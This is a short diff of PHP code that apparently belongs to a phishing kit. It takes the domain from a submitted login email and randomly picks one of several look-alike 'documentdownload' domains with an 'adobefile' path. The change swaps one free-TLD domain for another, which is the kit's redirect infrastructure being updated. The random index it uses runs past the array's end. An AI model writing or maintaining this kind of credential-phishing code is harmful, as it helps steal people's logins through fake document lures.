@@ -23,7 +23,7 @@ $domain = getDomainFromEmail($login);
 
 
 <?php
-$liks = array("https://documentdownload.ga/adobefile/",
+$liks = array("https://documentdownload.tk/adobefile/",
 "https://documentdownload.ml/adobefile/");
 
 $num= mt_rand(0,5);
